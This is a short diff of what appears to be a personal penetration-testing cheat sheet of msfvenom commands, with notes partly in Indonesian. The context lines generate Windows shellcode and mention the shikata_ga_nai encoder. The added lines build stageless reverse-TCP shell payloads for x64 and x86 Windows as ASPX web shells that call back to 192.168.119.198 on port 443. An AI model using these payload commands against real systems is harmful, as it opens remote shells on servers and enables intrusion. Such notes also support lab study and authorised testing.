@@ -10,3 +10,8 @@ msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=c
 #tips arsitektur + encoding
 -e x86/shikata_ga_nai
 
+
+#stagless shell
+msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.119.198 lport=443 -f aspx -o shell.aspx
+msfvenom -p windows/x86/shell_reverse_tcp lhost=192.168.119.198 lport=443 -f aspx -o shell.aspx
+
